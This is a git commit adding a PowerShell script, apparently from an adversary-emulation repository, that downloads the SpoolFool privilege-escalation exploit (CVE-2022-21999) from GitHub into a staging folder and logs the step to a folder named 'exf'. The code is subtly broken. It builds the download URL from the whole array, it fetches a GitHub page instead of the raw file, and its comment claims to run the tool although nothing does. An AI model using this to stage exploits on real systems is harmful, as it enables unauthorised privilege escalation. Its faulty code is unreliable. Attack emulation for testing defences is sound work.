a6e3cfe4264f736b690b7fcc25d3082f57f88a2e
JimBenna <jim.benna@gmail.com>
2025-12-13 19:08:30 +0100

    Added Script to download SpoolFool

---
+++ 0006_Privilege_Escalation/6002_Download_Use_SpoolFool.ps1
@@ -0,0 +1,28 @@
+# Downloads and Run SpoolFool
+# Exploit for CVE-2022-21999
+# Technic ID : T1068
+Clear-Host
+Write-Output "==============================================================================="
+Write-Output "Downloads and use spoolfool.exe  (T1068)"
+Write-Output "==============================================================================="
+################ [ List of commpiled programs to downlad ] ################
+$SoftToDownload = @("SpoolFool.exe")
+$DownloadFrom = "https://github.com/ly4k/SpoolFool/blob/main"
+################ [ GLOBAL VARIABLES ] ################
+$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
+$LogFile = "$env:PUBLIC\exf\Tool_SpoolFool.txt";
+$DestinationPath = "$env:PUBLIC\Toolz\";
+################ [ MAIN BODY ] ################
+Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
+Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
+Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
+Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
+Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
+foreach ($Tool in $SoftToDownload) 
+{
+    $DownloadRun = $DownloadFrom+"/"+$SoftToDownload
+    $DestinationFilename = $DestinationPath+"\"+$Tool;
+    $web = (New-Object System.Net.WebClient);
+    $result = $web.DownloadFile("$DownloadRun", "$DestinationFileName");
+    Write-Output "The file $Tool has been successfully downloaded from $DownloadRun and stored to $DestinationFilename" | Out-File -FilePath "$LogFile" -Append;
+  }
